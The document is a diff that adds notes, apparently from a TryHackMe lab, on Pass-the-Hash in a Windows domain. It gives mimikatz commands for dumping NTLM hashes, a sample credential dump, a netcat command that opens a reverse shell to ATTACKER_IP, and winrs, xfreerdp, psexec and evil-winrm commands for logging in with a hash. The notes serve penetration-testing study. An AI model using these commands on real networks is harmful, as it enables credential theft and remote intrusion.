@@ -1,0 +1,78 @@
+Pass-the-Hash with Mimikatz:
+As a result of extracting credentials from a host where we have attained administrative privileges (by using mimikatz or similar tools), 
+we might get clear-text passwords or hashes that can be easily cracked. However, 
+
+if we aren't lucky enough, we will end up with non-cracked NTLM password hashes.
+Although it may seem we can't really use those hashes, the NTLM challenge sent during authentication can be responded to just by knowing the password hash. 
+This means we can authenticate without requiring the plaintext password to be known. 
+Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully.
+
+To extract NTLM hashes, we can either use mimikatz to read the local SAM or extract hashes directly from LSASS memory.
+
+Extracting NTLM hashes from local SAM:
+This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.
+
+
+-1 Gaining acces to the machine
+    ->If needed install mimikatz.exe on it
+
+
+-2 run mimikatz:
+    mimikatz # privilege::debug
+    mimikatz # token::elevate
+
+    mimikatz # lsadump::sam
+
+    mimikatz # privilege::debug
+    mimikatz # token::elevate
+
+    Copy the needed NTLM infos as follow:
+
+        * Username : t1_toby.beck                                                          
+                * Domain   : ZA                                                                    
+                * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                      
+                * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                              
+                * DPAPI    : d9cd92937c7401805389fbb51260c45f 
+
+    Open a reverse shell Listenner n the ATTACKING Machine:
+        -nc -lvp 5555
+
+
+-3 We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell 
+(or any other command you like) as follows:
+
+    mimikatz # token::revert
+    mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912b
+    db9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555" 
+
+Notice we used token::revert to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. 
+This would be the equivalent of using runas /netonly but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.
+
+Interestingly, if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, 
+but any command run from here will actually use the credentials we injected using PtH.
+
+
+
+-4 use winrs to connect to a command prompt on THMIIS. Since t1_toby.beck's credentials are already injected in your session as a result of any of the attacks, 
+you can use winrs without specifying any credentials, and it will use the ones available to your current session:
+
+    winrs.exe -r:THMIIS.za.tryhackme.com cmd
+
+
+
+Bonus:
+Passing the Hash Using Linux:
+
+If you have access to a linux box (like your AttackBox), several tools have built-in support to perform PtH using different protocols. 
+Depending on which services are available to you, you can do the following:
+    Connect to RDP using PtH:
+
+    xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+    Connect via psexec using PtH:
+
+    psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+    Note: Only the linux version of psexec support PtH.
+
+    Connect to WinRM using PtH:
+
+    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
